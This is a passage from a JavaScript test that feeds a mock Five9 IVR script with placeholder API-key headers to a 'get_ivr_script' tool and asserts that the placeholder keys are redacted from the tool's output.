  const xml = '<m><entry><key>Ocp-Apim-Subscription-Key</key><value>OCP-1</value></entry><entry><key>x-functions-key</key><value>FK-1</value></entry></m>';
  const escaped = xml.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
    const text = JSON.stringify(await callTool(cfg, 'get_ivr_script', { name: 'Main' }));
    for (const s of ['OCP-1', 'FK-1']) assert.ok(!text.includes(s), s);
  });
});
